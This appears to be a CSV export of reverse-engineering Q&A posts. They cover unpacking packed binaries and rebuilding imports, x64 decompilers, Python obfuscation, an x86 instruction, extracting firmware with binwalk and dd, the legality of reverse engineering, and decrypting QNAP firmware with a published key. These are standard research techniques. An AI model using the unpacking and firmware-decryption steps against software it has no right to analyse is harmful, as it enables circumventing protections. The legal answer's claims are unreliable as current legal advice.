<p>It's somewhat simpler (IMO) in IDA. You just need to find the import table and rename the pointers according to the functions they are currently pointing to (this should be done while debugger is active). You can use either <code>renimp.idc</code> script or UUNP ""manual reconstruct feature"" (see <a href=""http://www.hexblog.com/?p=403"">here</a>).</p>

<p>For finding import table there are two tricks I sometimes use:</p>

<ul>
<li><p>follow some calls in the startup code at OEP to find external APIs and this should lead you to the import table. Usually the start and the end of the table is obvious.</p></li>
<li><p>during unpacking, set a breakpoint on GetProcAddress and see where the results are written. This however won't work with packers that use manual import resultion using the export directory. Putting a read BP on kernel32's export table might help here.</p></li>
</ul>

<h2>5. Clean up</h2>

<p>This is optional but it may be useful to remove the remains of the packer code that would only distract you. In IDA, you should also apply a compiler FLIRT signature if you recognize the compiler used.</p>

<h2>6. Making an unpacked executable</h2>

<p>I don't do this step as I rarely need to run the unpacked file but in general you usually need to fix up the PE header so that offsets to the section's code in file match those in the dump.</p>

<hr>

<p>Now, there are many variations and tricks not covered by the above steps. For example, some packers don't fully resolve imports initially but put jumps to stubs that resolve import on first call and then patch it so it goes directly to the target next time. Then there is ""stolen code"" approach which makes it harder to find and recover OEP. Sometimes the packer runs a copy of itself and debugs it, so that you can't attach your own debugger to it (this can be solved by using emulator or a debugger that doesn't use debugging APIs like Intel PIN). Still, the outlined steps can cover quite a lot of what's out there.</p>

<p>I will conclude with the video that Elias made showing the process of unpacking the Lighty Compressor: <a href=""https://www.hex-rays.com/video/bochs_video_2.html"">https://www.hex-rays.com/video/bochs_video_2.html</a></p>
","91"
"64 bit Pseudocode decompiler","13198","","<p>I have a 64 bit program im debugging. 
I found the function i need to learn more about to potentially ""fix"" the problem (there is no source code available for the program).</p>

<p>To speed  things up, i wanted to decompile and go over it in pseudocode  as my assembler is still quite weak.
However i did not find any working solutions that would work with x64.</p>

<p>I am using only x64 windows platform so linux/mac solutions wont work (hopper is only 32 bit on windows).
Hex-rays is x86 as well.
There was ida-decompiler python scripts that i didn't get to work no matter what i did ( no output or pseudocode was generated).</p>

<p>Is there any other solutions i could try that does support x64 and has pseudocode support?</p>
","<p>Try C4Decompiler and <a href=""http://www.backerstreet.com/rec/rec.htm"" rel=""nofollow noreferrer"">REC Studio 4</a>.</p>
","3598"
"What are the techniques and tools to obfuscate Python programs?","13055","","<p>This question is related to this  <a href=""https://reverseengineering.stackexchange.com/questions/1934/is-it-possible-to-get-python-bytecode-without-using-co-code"">other one</a>. I just wonder what are the techniques applicable and which can be found in the real world to obfuscate Python program (similar questions can be found on stackoverflow <a href=""https://stackoverflow.com/questions/261638/how-do-i-protect-python-code"">here</a> and <a href=""https://stackoverflow.com/questions/576963/python-code-obfuscation"">here</a>).</p>

<p><a href=""https://reverseengineering.stackexchange.com/questions/1934/is-it-possible-to-get-python-bytecode-without-using-co-code/1942#1942"">mikeazo mentioned</a> the fact that his program was provided with a custom Python interpreter, but what are the other techniques and how efficient are they ?</p>
","<p>Here are tricks you can use when packaging your python app with a custom interpreter.</p>

<ol>
<li>Remap the opcodes for the interpreter</li>
<li>Encrypt the pyc files (the custom interpreter decrypts before importing)</li>
<li>Remove access to co_code in the interpreter (delete the reference to co_code in the code_memberlist array declaration in codeobject.c of the interpreter)</li>
<li>Obfuscate/protect the python interpreter</li>
<li>Do not bundle modules such as <code>dis</code> which would help in reverse engineering (basically reverse engineer an unobfuscated python program, note all modules/techniques you find useful and remove them from the custom interpreter)</li>
<li>Modify the interpreter so it can only import pyc files (can be done by removing the compile modules or filtering in the interpreter)</li>
<li>The <a href=""http://code.google.com/p/pyretic/"">pyREtic</a> folks give a few standard techniques for entering the custom interpreter. Testing these out on your app and trying to disable those access methods would make things much harder for a reverse engineer.</li>
<li>Remove functions from interpreter which the RE could call to help him/her out such as <code>PyRunString()</code>. Otherwise they can attach with a debugger and run arbitrary python code.</li>
</ol>

<h3>References</h3>

<ul>
<li><a href=""https://www.defcon.org/images/defcon-18/dc-18-presentations/RSmith/DEFCON-18-RSmith-pyREtic.pdf"">pyREtic – In memory reverse engineering for obfuscated Python bytecode</a> by Rich Smith. DEFCON-18, Las Vegas, 2010.</li>
</ul>
","1974"
"What does the assembly instruction 'REPNE SCAS BYTE PTR ES:[EDI]'?","12918","","<p>I disassembled a file with OllyDbg and it had the following instruction:</p>

<pre><code>REPNE SCAS BYTE PTR ES:[EDI]
</code></pre>

<p>What does that exactly mean ?</p>
","<p>The <code>SCAS</code> instruction is used to scan a string (<code>SCAS</code> = SCan A String). It compares the content of the accumulator (<code>AL</code>, <code>AX</code>, or <code>EAX</code>) against the current value pointed at by <code>ES:[EDI]</code>.</p>

<p>When used together with the <code>REPNE</code> prefix (<em>REPeat while Not Equal</em>), <code>SCAS</code> scans the string searching for the first string element which is equal to the value in the accumulator. </p>

<p>The Intel manual (Vol. 1, p.231) says:</p>

<blockquote>
  <p>The SCAS instruction subtracts the destination string element from the contents of the EAX, AX, or AL register (depending on operand length) and updates the status flags according to the results. The string element and register contents are not modified. The following “short forms” of the SCAS instruction specify the operand length: SCASB (scan byte string), SCASW (scan word string), and SCASD (scan doubleword string).</p>
</blockquote>

<p>So, basically, this instruction scan a string and look for the same character than the one stored in <code>EAX</code>. It won't touch any registers other than ECX (counter) and EDI (address) but the status flags according to the results.</p>
","2775"
"Extract files from a bin firmware","12323","","<p>I have a firmware image that is used for flashing a BMW NBT navigation system that I want to research. I did a binwalk on the file (dump below).</p>

<p>I want to extract the individual files, especially the ELF files and the LZMA compressed files. Can this be done with objcopy and dd ?</p>

<p>A small example would be great.</p>

<pre><code>DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
114           0x72            XML document, version: ""1.0""
8840          0x2288          ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
52909         0xCEAD          eCos RTOS string reference: ""ECOScheme COP1 V1.6""
53692         0xD1BC          eCos RTOS string reference: ""ECOScheme COP1 V1.6""
58157         0xE32D          ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
64383         0xFB7F          eCos RTOS string reference: ""ECOScheme COP1 V1.6""
65035         0xFE0B          eCos RTOS string reference: ""ECOScheme COP1 V1.6""
65611         0x1004B         eCos RTOS string reference: ""ECOScheme COP1 V1.6""
66263         0x102D7         eCos RTOS string reference: ""ECOScheme COP1 V1.6""
68264         0x10AA8         ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV)
105904        0x19DB0         LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, missing uncompressed size
254206        0x3E0FE         ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV)
1672272       0x198450        eCos RTOS string reference: ""ECOScheme COP1 V1.6""
1865538       0x1C7742        LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, missing uncompressed size
1873098       0x1C94CA        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
1884709       0x1CC225        LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, missing uncompressed size
1884817       0x1CC291        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
1895380       0x1CEBD4        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
1976563       0x1E28F3        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
1994774       0x1E7016        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
2067424       0x1F8BE0        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
2109540       0x203064        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
2190676       0x216D54        LZMA compressed data, properties: 0x5E, dictionary size: 16777216 bytes, uncompressed size: 100663296 bytes
2191505       0x217091        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
2322380       0x236FCC        LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, missing uncompressed size
2322488       0x237038        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
2325714       0x237CD2        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
2341002       0x23B88A        LZMA compressed data, properties: 0x64, dictionary size: 16777216 bytes, uncompressed size: 100663296 bytes
2341757       0x23BB7D        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
2416921       0x24E119        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
2420792       0x24F038        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
2497195       0x261AAB        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
2668975       0x28B9AF        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
2769589       0x2A42B5        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
2848565       0x2B7735        LZMA compressed data, properties: 0x5E, dictionary size: 16777216 bytes, uncompressed size: 50331648 bytes
2849037       0x2B790D        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
3035059       0x2E4FB3        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
3064068       0x2EC104        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
3109994       0x2F746A        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
3138482       0x2FE3B2        LZMA compressed data, properties: 0x5E, dictionary size: 16777216 bytes, uncompressed size: 100663296 bytes
3139318       0x2FE6F6        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
3351394       0x332362        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
3383710       0x33A19E        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
3388738       0x33B542        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
3488674       0x353BA2        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
3537093       0x35F8C5        LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, missing uncompressed size
3537201       0x35F931        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
3551343       0x36306F        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
3557569       0x3648C1        eCos RTOS string reference: ""ECOScheme COP1 V1.6""
3558221       0x364B4D        eCos RTOS string reference: ""ECOScheme COP1 V1.6""
3558797       0x364D8D        eCos RTOS string reference: ""ECOScheme COP1 V1.6""
3559449       0x365019        eCos RTOS string reference: ""ECOScheme COP1 V1.6""
3561455       0x3657EF        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
4111948       0x3EBE4C        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
4313272       0x41D0B8        eCos RTOS string reference: ""ECOScheme""
4571691       0x45C22B        LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, missing uncompressed size
4571799       0x45C297        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
4574094       0x45CB8E        mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CBC, keymode: 8bit
4653693       0x47027D        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
4671701       0x4748D5        LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, missing uncompressed size
6264853       0x5F9815        LZMA compressed data, properties: 0x90, dictionary size: 16777216 bytes, uncompressed size: 9995975 bytes
6655733       0x658EF5        LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, missing uncompressed size
6656288       0x659120        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
6663431       0x65AD07        mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CBC, keymode: 8bit
6985016       0x6A9538        LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, uncompressed size: 50331648 bytes
6985572       0x6A9764        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
7350538       0x70290A        LZMA compressed data, properties: 0xD8, dictionary size: 16777216 bytes, uncompressed size: 203703495 bytes
7436659       0x717973        Copyright string: "" 1995-2005 Jean-loup Gailly valid block type""
7441843       0x718DB3        Copyright string: "" 1995-2005 Mark Adler ""
7475248       0x721030        LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, uncompressed size: 50331648 bytes
7475807       0x72125F        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
7489707       0x7248AB        LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, missing uncompressed size
7490222       0x724AAE        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
8328766       0x7F163E        LZMA compressed data, properties: 0xC7, dictionary size: 4194304 bytes, uncompressed size: 272680704 bytes
9051574       0x8A1DB6        Ubiquiti partition header, header size: 56 bytes, name: ""ICLE"", base address: 0x00000000, data size: 0 bytes
9298202       0x8DE11A        LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, missing uncompressed size
9298762       0x8DE34A        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
9307694       0x8E062E        LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, missing uncompressed size
9308222       0x8E083E        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
9335661       0x8E736D        Copyright string: "" 1995-2005 Mark Adler ""
9338719       0x8E7F5F        LZMA compressed data, properties: 0x5D, dictionary size: 262144 bytes, missing uncompressed size
9339847       0x8E83C7        LZMA compressed data, properties: 0x5D, dictionary size: 524288 bytes, missing uncompressed size
9339990       0x8E8456        LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, missing uncompressed size
9340503       0x8E8657        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
9921653       0x976475        eCos RTOS string reference: ""ECOScheme Version. COP1 (Version 1.6 or greater) supported.""
9924189       0x976E5D        eCos RTOS string reference: ""ECOScheme Version. Version 1.6 or greater supported.""
9974124       0x98316C        LZMA compressed data, properties: 0x64, dictionary size: 16777216 bytes, uncompressed size: 10835 bytes
10064980      0x999454        ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV)
10079707      0x99CDDB        mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CBC, keymode: 8bit
10171624      0x9B34E8        eCos RTOS string reference: ""eCost""
11268739      0xABF283        LZMA compressed data, properties: 0xC7, dictionary size: 4194304 bytes, uncompressed size: 272680704 bytes
11269511      0xABF587        LZMA compressed data, properties: 0xC7, dictionary size: 4194304 bytes, uncompressed size: 272680704 bytes
12395860      0xBD2554        XML document, version: ""1.0""
12747285      0xC28215        Copyright string: "" (C) 2010. Hitachi ULSI Systems Co.,Ltd. Co.,Ltd.""
12747445      0xC282B5        Copyright string: "" (C) 2009. Hitachi ULSI Systems Co.,Ltd. Co.,Ltd.""
12758672      0xC2AE90        LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, missing uncompressed size
</code></pre>
","<p>You can use the -D option to dd out sections based on signature.</p>

<p>For example, to extract out the ELF parts, do:</p>

<pre><code>binwalk -D ""elf 32-bit lsb shared object"":.so image.bin
</code></pre>

<p>Note the lowercase signature string.</p>

<p>You can specify more than one instance of -D.</p>

<p>See the binwalk wiki for more details:
<a href=""https://github.com/devttys0/binwalk/wiki"">https://github.com/devttys0/binwalk/wiki</a></p>
","8080"
"Is reverse engineering and using parts of a closed source application legal?","11903","","<p>Is it legal to reverse engineer certain features of a closed source application and then integrate those features into a closed or open source application that may be either a commercial or non-commercial application ?</p>

<hr>

<p>Brownie points for an answer covering the situation in India.</p>
","<h2>In the United States</h2>

<p>The short answer is no for the purposes you've stated in your question, but keep reading to see exactly what is allowed. Also worth reading are the two links included herein.</p>

<p>In the U.S., Section 103(f) of the Digital Millennium Copyright Act (DMCA) (<a href=""http://www.law.cornell.edu/uscode/text/17/1201"" rel=""noreferrer"">17 USC § 1201 (f)</a> - Reverse Engineering) specifically states that it is legal to reverse engineer and circumvent the protection to achieve interoperability between computer programs (such as information transfer between applications). Interoperability is defined in paragraph 4 of Section 103(f).</p>

<p>It is also often lawful to reverse-engineer an artifact or process as long as it is obtained legitimately. If the software is patented, it doesn't necessarily need to be reverse-engineered, as patents require a public disclosure of invention. It should be mentioned that, just because a piece of software is patented, that does not mean the entire thing is patented; there may be parts that remain undisclosed.</p>

<p>Also of note is that in the U.S. most End-User License Agreements (EULAs) specifically prohibit reverse-engineering. Courts have found such contractual prohibitions to override the copyright law which expressly permits it (<a href=""https://law.resource.org/pub/us/case/reporter/F3/320/320.F3d.1317.01-1109.01-1108.html"" rel=""noreferrer""><em>Bowers v. Baystate Technologies</em>, 320 F.3d 1317 (Fed. Cir. 2003)</a>).</p>

<p>In other words, for your purposes, it sounds like it would be illegal to integrate features from a reverse-engineered program into another program for commercial or non-commercial use. If you were trying to enable interoperability (again, see Section 103(f), noted above), that would be different.</p>

<h2><strong>In India</strong></h2>

<p>From what I can find, the direct reverse engineering of software, in whole or in part, for use in your own software for commercial use, is protected under copyright. The protected reasons for reverse engineering are similar to those in the United States. According to the article <a href=""http://kvtrust.blogspot.com/2007/09/trade-secret-contract-and-reverse.html"" rel=""noreferrer"">Trade Secret, Contract and Reverse Engineering</a> (also note end note 5), the copyright act broadly protects actions (including reverse engineering) for the following purposes:</p>

<ul>
<li>Obtaining information essential for achieving interoperability of an independently created computer program with other programs if such information is not otherwise readily available.</li>
<li>Determining the ideas and principles underlying any element of the program for which the computer program was supplied.</li>
<li>Making copies or adaptations of a legally obtained copy of the computer program for non-commercial, personal use.</li>
</ul>

<p>Additionally, due to section 23 of the Indian Contract Act, which handles all contracts including License Agreements, a contract is declared void if it goes against public policy. Section 52 of the Copyright Act declares public policy concerning reverse engineering, which is that it is permitted in a limited way. A contract (or EULA), prohibiting reverse engineering in software to the extent permitted by the Copyright Act, may not stand in a court of law.</p>

<p>Section 52, subsections (aa) through (ad) of the Copyright Act explain these protected acts (see <a href=""http://copyright.gov.in/Documents/CopyrightRules1957.pdf"" rel=""noreferrer"">Indian Copyright Act 1957</a>, page 33, along with section 18 of <a href=""http://copyright.lawmatters.in/2012/06/impact-of-2012-amendments-to-copyright.html"" rel=""noreferrer"">these revisions from 2012</a>). Another source (though possibly a bit outdated) is <a href=""http://www.123helpme.com/view.asp?id=36962"" rel=""noreferrer"">Software Patent and Copyright Laws in India</a> (a paper) with its footnotes.</p>
","73"
"Firmware analysis and file system extraction?","11896","","<p>I'm trying to analyse the firmware image of a NAS device.</p>

<p>I used various tools to help the analysis (binwalk, deezee, signsrch, firmware-mod-kit which uses binwalk AFAIK), but all of them have been unsuccessful so far.</p>

<p>For example binwalk seems to generate false positive regarding gzip compressed data and Cisco IOS experimental microcode.</p>

<pre><code>Scan Time:     2013-08-27 14:52:15
Signatures:    196
Target File:   firmware.img
MD5 Checksum:  4d34d45db310bf599b62370f92d0a425

DECIMAL         HEX             DESCRIPTION
-------------------------------------------------------------------------------------------------------------------
80558935        0x4CD3B57       gzip compressed data, ASCII, has CRC, last modified: Fri Oct  4 17:37:33 2019
82433954        0x4E9D7A2       Cisco IOS experimental microcode
145038048       0x8A51AE0       gzip compressed data, ASCII, extra field, last modified: Mon May 26 20:11:40 2014  
</code></pre>

<p>When trying to decompress the data I got the following error using gunzip/gzip</p>

<pre><code>gzip: 4CD3B57.gz is a multi-part gzip file -- not supported
</code></pre>

<p>According to gzip FAQ (<a href=""http://www.gzip.org/#faq2"">http://www.gzip.org/#faq2</a>) this is due to a transfer not made in binary mode which has corrupted the gzip header.</p>

<p>It looks more like a false positive from binwalk to me mostly because the magic number used to identify gzip data can easily trigger false positive and the dates are wrong.</p>

<p>I also ran strings and hexdump command in order to have an idea of the contents of the file and try to identify known pattern but it didn't help much so far (I probably lack experience in that type of thing here).</p>

<p>The only non-gibberish/identifiable strings are located at the end of the firmware image.</p>

<pre><code>00000000  f5 7b 47 03 d5 08 bf 64  ba e9 99 d8 48 cf 81 18  |.{G....d....H...|
00000010  b1 69 1e 2c c2 f3 46 6b  53 2b b7 63 e8 ce 78 c9  |.i.,..FkS+.c..x.|
00000020  87 fd b8 68 41 4d b2 61  71 cb cc 75 eb 8c e0 75  |...hAM.aq..u...u|
00000030  25 d1 ec bd 6d 46 e8 16  37 c6 f5 2e 2a e0 dc 07  |%...mF..7...*...|
00000040  65 b1 ce 7f 20 57 7c d7  cb 1d 91 fc 05 25 ad af  |e... W|......%..|
00000050  58 56 ff 13 4d 03 95 7f  ad 58 0e 84 85 2f 73 5c  |XV..M....X.../s\|
00000060  d9 19 d4 d4 2c 27 be c6  45 f2 9f a4 b1 e1 04 f1  |....,'..E.......|
00000070  c1 28 17 9c e1 f7 9d 2b  63 c3 7d e1 95 56 06 05  |.(.....+c.}..V..|
[...]
09ec9d60  4b 29 75 20 46 6e fb e3  0f 14 d4 93 54 8e 4f bb  |K)u Fn......T.O.|
09ec9d70  4b ab 91 bf e7 8a b9 4e  c8 ff 87 17 93 19 e9 3f  |K......N.......?|
09ec9d80  70 fe a6 9f d3 36 48 83  34 48 83 34 48 83 34 48  |p....6H.4H.4H.4H|
09ec9d90  83 34 48 83 34 48 83 34  48 83 34 48 83 34 48 83  |.4H.4H.4H.4H.4H.|
09ec9da0  34 48 83 34 48 83 34 48  83 34 48 83 34 48 83 34  |4H.4H.4H.4H.4H.4|
09ec9db0  48 83 34 48 83 34 48 83  34 48 83 34 48 83 24 a7  |H.4H.4H.4H.4H.$.|
09ec9dc0  ff 07 e9 0d 37 73 00 20  08 0a 69 63 70 6e 61 73  |....7s. ..icpnas|
09ec9dd0  00 00 10 00 54 53 2d 35  36 39 00 00 00 00 00 00  |....TS-569......|
09ec9de0  00 00 00 00 33 2e 38 2e  33 00 00 00 00 00 00 00  |....3.8.3.......|
09ec9df0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
09ec9e14
</code></pre>

<p>It is the first time I'm going through that type of exercise and I'm not sure what I should do next. The image seems to be obfuscated somehow (that might be a wrong assumption).</p>

<p>Do you have suggestions/tricks that could help me make some progress?</p>
","<p>I've been dissecting the firmware for another type of embedded device for a while and thought I'd see if I could find anything out.  After a few hours I figured it out!  There is a hard way and an easy way that I found only after digging the hard way.  This is a long post, but I hope it will help others in similar ventures.</p>

<p>A little Googling and I found <a href=""http://wiki.qnap.com/wiki/Firmware_Recovery"">http://wiki.qnap.com/wiki/Firmware_Recovery</a> describing full firmware recovery methods and another page on the same wiki for ""Manually Updating Firmware"" with command line examples. A couple of things stuck out ...</p>

<ul>
<li><p>The NAS OS has a script for processing a firmware update image:</p>

<pre><code># /etc/init.d/update.sh /mnt/HDA_ROOT/update/TS-209_2.1.2_build1031.img
</code></pre></li>
<li><p>There is a checksum embedded in the binary and THEN there is this line in the output:</p>

<pre><code>""Using 120-bit encryption - (QNAPNASVERSION4)""
</code></pre></li>
</ul>

<p>I went down 2 paths: the hard way, and the very easy way ...</p>

<h3>The Hard Way (but with useful tips)</h3>

<p>I downloaded the TS-569 full system recovery image from the Firmware Recovery page which took almost 2 hours for 500MB.  Now I had to figure out what I was working with:  </p>

<pre><code># file F_TS-569_20120628-1.2.2.img
F_TS-569_20120628-1.2.2.img: x86 boot sector; GRand Unified Bootloader, ...
</code></pre>

<p>A full disk image which looks like this:</p>

<pre><code>$ fdisk -l F_TS-569_20120628-1.2.2.img
                      Device Boot      Start         End      Blocks   Id  System
F_TS-569_20120628-1.2.2.img1              32        4351        2160   83  Linux
F_TS-569_20120628-1.2.2.img2   *        4352      488959      242304   83  Linux
F_TS-569_20120628-1.2.2.img3          488960      973567      242304   83  Linux
F_TS-569_20120628-1.2.2.img4          973568     1007615       17024    5  Extended
F_TS-569_20120628-1.2.2.img5          973600      990207        8304   83  Linux
F_TS-569_20120628-1.2.2.img6          990240     1007615        8688   83  Linux
</code></pre>

<p>Separate out the partitions (or you could write the image to a spare disk):</p>

<pre><code># dd if=F_TS-569_20120628-1.2.2.img bs=512 of=part1 skip=32 count=2160w
# dd if=F_TS-569_20120628-1.2.2.img bs=512 of=part2 skip=4352 count=242304w
# dd if=F_TS-569_20120628-1.2.2.img bs=512 of=part3 skip=488960 count=242304w
# dd if=F_TS-569_20120628-1.2.2.img bs=512 of=part5 skip=973600 count=8304w
# dd if=F_TS-569_20120628-1.2.2.img bs=512 of=part6 skip=990240 count=8688w  
... which gives  
-rw-r--r-- 1 root   root     2211840 2013-08-30 15:41 part1
-rw-r--r-- 1 root   root   248119296 2013-08-30 15:42 part2
-rw-r--r-- 1 root   root   248119296 2013-08-30 15:42 part3
-rw-r--r-- 1 root   root     8503296 2013-08-30 15:42 part5
-rw-r--r-- 1 root   root     8896512 2013-08-30 15:42 part6
</code></pre>

<p>Partition 3 is a mirror of partition 2, verified through md5sum.  Partitions 5 and 6 are empty, likely for scratch space.  Partition 1 is <strong>/boot/grub</strong> which contains modules and the like for booting and hardware configuration. So lets look at partition 2, the boot partition.</p>

<pre><code># mkdir /mnt/ts2
# mount -r part2 /mnt/ts2 -o loop
# ls -la /mnt/ts2/boot
-rw-r--r-- 1 root root  3982976 2012-06-27 22:17 bzImage
-rw-r--r-- 1 root root       81 2012-06-27 22:17 bzImage.cksum
-rw-r--r-- 1 root root  8890727 2012-06-27 22:17 initrd.boot
-rw-r--r-- 1 root root       85 2012-06-27 22:17 initrd.boot.cksum
-rw-r--r-- 1 root root 73175040 2012-06-27 22:17 qpkg.tar
-rw-r--r-- 1 root root       83 2012-06-27 22:17 qpkg.tar.cksum
-rw-r--r-- 1 root root 33593992 2012-06-27 22:17 rootfs2.bz
-rw-r--r-- 1 root root       85 2012-06-27 22:17 rootfs2.bz.cksum
-rw-r--r-- 1 root root 31160679 2012-06-27 22:17 rootfs_ext.tgz
-rw-r--r-- 1 root root       87 2012-06-27 22:17 rootfs_ext.tgz.cksum
# file -z /mnt/ts2/boot/initrd.boot
/mnt/ts2/boot/initrd.boot: Linux rev 1.0 ext2 filesystem data, UUID=770ce31c-d03f-484e-81e8-6911340bdcbf (gzip compressed data, from Unix, last modified: Wed Jun 27 22:16:58 2012, max compression)
</code></pre>

<ul>
<li>bzImage is the compressed kernel image</li>
<li>initrd is the initial ramdisk root filesystem that gets the OS running</li>
<li>qpkg.tar holds various software packages for the NAS</li>
<li>rootfs2.bz is a compressed tarball of some /home, /lib, and /usr files</li>
<li>rootfs_ext.tgz is a compressed tarball of another ext2 filesystem of /opt/source for apache, php5, mysql, and what appears to be a backup of the NVRAM settings.</li>
</ul>

<p>All of the magic is inside the initrd filesystem image.  Peering into that we get:</p>

<pre><code># gunzip -c /mnt/ts2/boot/initrd.boot &gt;/tmp/initrd.boot.img
# mkdir /mnt/tsinitrd
# mount -r /tmp/initrd.boot.img /mnt/tsinitrd -o loop
# ls -la /mnt/tsinitrd
drwxr-xr-x  2 root root  2048 2012-06-27 22:05 bin
drwxr-xr-x  5 root root 13312 2012-06-27 22:11 dev
drwxr-xr-x 22 root root  2048 2012-06-27 22:15 etc
drwxr-xr-x  3 root root  3072 2012-06-27 22:05 lib
drwxr-xr-x  2 root root  1024 2010-11-03 04:53 lib64
lrwxrwxrwx  1 root root    11 2012-06-27 22:16 linuxrc -&gt; bin/busybox
drwx------  2 root root 12288 2012-06-27 22:16 lost+found
drwxr-xr-x  4 root root  1024 2012-06-27 22:04 mnt
drwxr-sr-x  2 root root  1024 2012-06-27 22:16 opt
lrwxrwxrwx  1 root root    19 2012-06-27 22:16 php.ini -&gt; /etc/config/php.ini
drwxr-sr-x  2 root root  1024 1999-11-02 18:54 proc
lrwxrwxrwx  1 root root    18 2012-06-27 22:16 Qmultimedia -&gt; /share/Qmultimedia
drwxr-xr-x  3 root root  1024 2007-07-18 05:24 root
drwxr-xr-x  2 root root  5120 2012-06-27 22:15 sbin
drwxrwxr-x 29 root root  1024 2006-02-28 00:57 share
drwxrwxrwx  4 root root  1024 2006-02-28 00:57 tmp
drwxrwxrwx  8 root root  1024 2012-06-27 22:15 var
</code></pre>

<p>Remember the 2 things that stuck out from the Firmware Recovery page?  The update script and the encryption reference:</p>

<pre><code># more /mnt/tsinitrd/etc/init.d/update.sh
...
... line 223
    /sbin/PC1 d QNAPNASVERSION4 $path_name ${_tgz};
...
</code></pre>

<p>There's the reference to what appears to be the encryption key and perhaps the decrypter!
Since this NAS firmware image is x86 based, and I'm in an x86 VM, might as well try it:</p>

<pre><code># /mnt/tsinitrd/sbin/PC1
Usage: pc1 e|d ""key"" sourcefile &lt;targetfile&gt;
where: e - encrypt, d - decrypt &amp; ""key"" is the encryption key.
The length of the key will determine strength of encryption
If no targetfile, output file name is equal to sourfile name
ie: 5 characters is 40-bit encryption.
</code></pre>

<p>And finally:</p>

<pre><code># /mnt/tsinitrd/sbin/PC1 d QNAPNASVERSION4 TS-569_20130726-4.0.2.img TS-569_20130726-4.0.2.tgz
Using 120-bit encryption - (QNAPNASVERSION4)
len=1048576
model name = TS-569
version = 4.0.2

# tar -tvf TS-569_20130726-4.0.2.tgz 
-rw-r--r-- root/root       106 2013-07-25 20:49 bios_layout
drwxr-xr-x root/root         0 2013-07-25 20:49 boot/
-rw-r--r-- root/root   4557984 2013-07-25 20:49 bzImage
-rw-r--r-- root/root        69 2013-07-25 20:49 bzImage.cksum
drwxr-xr-x root/root         0 2013-07-25 20:49 config/
-rwxr-xr-x root/root     48408 2013-07-25 20:49 dmidecode
-rwxr-xr-x root/root    356714 2013-07-25 20:49 flashrom
-rw-r--r-- root/root   2097152 2013-07-25 20:49 flashrom.img
-rw-r--r-- root/root        33 2013-07-25 20:49 fw_info
-rw-r--r-- root/root   8480290 2013-07-25 20:49 initrd.boot
-rw-r--r-- root/root        73 2013-07-25 20:49 initrd.boot.cksum
-rwxr-xr-x root/root   1606508 2013-07-25 20:49 libcrypto.so.1.0.0
-rwxr-xr-x root/root    372708 2013-07-25 20:49 libssl.so.1.0.0
-rw-r--r-- root/root  81090560 2013-07-25 20:49 qpkg.tar
-rw-r--r-- root/root        72 2013-07-25 20:49 qpkg.tar.cksum
-rw-r--r-- root/root  41185897 2013-07-25 20:49 rootfs2.bz
-rw-r--r-- root/root        74 2013-07-25 20:49 rootfs2.bz.cksum
